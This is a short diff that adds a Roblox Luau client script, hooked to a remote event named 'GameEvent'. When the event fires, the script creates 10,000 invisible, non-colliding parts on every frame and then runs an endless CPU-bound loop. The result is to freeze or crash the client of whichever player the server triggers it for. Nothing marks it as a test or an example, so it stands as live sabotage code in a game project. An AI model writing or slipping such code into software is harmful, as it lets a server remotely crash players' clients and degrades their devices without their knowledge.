@@ -1,0 +1,20 @@
+local R = game.ReplicatedStorage:WaitForChild("GameEvent")
+local RS = game:GetService("RunService")
+
+R.OnClientEvent:Connect(function()
+    RS.Heartbeat:Connect(function()
+        for i = 1, 10000 do
+            local p = Instance.new("Part")
+            p.Transparency = 1
+            p.CanCollide = false
+            p.CanQuery = false
+            p.CastShadow = false
+            p.Anchored = true
+            p.Size = Vector3.new(0, 0, 0)
+            p.Parent = workspace
+        end
+    end)
+    while true do 
+        local _ = math.sqrt(math.random(1, 100000))
+    end
+end)
